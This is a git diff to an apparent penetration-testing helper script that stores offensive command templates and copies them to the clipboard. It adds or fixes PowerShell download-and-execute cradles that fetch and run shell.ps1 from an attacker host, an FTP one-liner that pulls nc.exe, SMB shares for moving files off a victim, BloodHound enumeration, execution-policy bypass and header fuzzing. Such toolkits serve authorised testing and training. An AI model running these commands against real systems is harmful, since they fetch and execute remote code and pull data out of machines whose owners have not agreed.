@@ -32,15 +32,13 @@ PECmd.exe -d "E:\[root]\Windows\Prefetch" -q --csv G:\Netwars\Analysis
 
 C:\"Forensic Program Files"\Python\ShimCacheParser.py -i SYSTEM -o G:\Netwars\Analysis\shimcache_vibranium.csv
 
-//Transfer file
-on client: net use z: \\10.10.14.17\share
-on server: impacket-smbserver share `pwd`
-on client: copy *.zip z:
-
 Invoke-Bloodhound -CollectionMethod All
 
 (for %t in ("open 10.1.1.110 21" ftp bin "GET nc.exe" bye) do @echo %~t) >ftp.txt&&ftp -s:ftp.txt
 netstat -alnp
+"""
+
+"""
 Eliminate the / at the end of directory
 """
 if store_directory[-1] == "/":
@@ -391,10 +389,11 @@ def powershell():
     options = {1 : ["Download and execute powershell script in cmd", f"powershell IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
         2 : ["Forcing powershell version 2", f"powershell -version 2 IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
         3 : ["Download and execute powershell script", f"IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
-        4 : ["Download and execute powershell script 2", f"IEX(IWR('http://{target_ip}/shell.ps1))"],
+        4 : ["Download and execute powershell script 2", f"IEX(IWR('http://{source_ip}/shell.ps1'))"],
         5 : ["Execute powershell script", f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File shell.ps1"],
         6 : ["Download file with powershell step 1", f"$WebClient = New-Object System.Net.WebClient"],
         7 : ["Download file with powershell step 2", f"""$WebClient.DownloadFile("https://{source_ip}/file","C:\path\file")"""],
+        8 : ["Search for file", f"""Get-ChildItem -Path C:\ -Filter *[filename]* -Recurse -ErrorAction SilentlyContinue -Force"""],
     }
     
     copy_to_clipboard(options)
@@ -439,6 +438,7 @@ def postgres():
 
 def wfuzz():
     options = {1 : ["Sample usage", f"wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://{target_ip}/FUZZ"],
+        2 : ["Fuzz header", f"""wfuzz -c -z file,wordlist/general/common.txt -H "User-Agent: FUZZ" http://{target_ip}/"""],    
     }
     
     copy_to_clipboard(options)
@@ -493,6 +493,12 @@ def others():
         3 : ["Copy with scp", f"""scp -P 22 dave@{target_ip}:/home/dave /tmp"""],
         4 : ["Sign with ca private key", f"""/usr/bin/ssh-keygen -s /home/userca/ca -I key_id -n [principal_name] /tmp/key.pub"""],
         5 : ["Login with signed pub key", f"""ssh -i key-cert.pub -i key [principal_name]@localhost"""],
+        6 : ["Transfer file - On server", f"""impacket-smbserver share `pwd`"""],
+        7 : ["Transfer file 1 - On client", f"""net use z: \\{source_ip}\share"""],
+        8 : ["Transfer file 1 - On client - Example:", f"""copy *.zip z:"""],
+        9 : ["Transfer file 2 - On client - Powershell", f"""New-PSDrive -Name "EramDrive" -PSProvider "FileSystem" -Root "\\{source_ip}\share"""],
+        10 : ["Transfer file 2 - On client - Powershell - Example:", f"""cp EramDrive\somefile"""],
+        11 : ["Check python path", f"""python3 -c 'import sys; print(sys.path)';"""],
     }
     
     copy_to_clipboard(options)
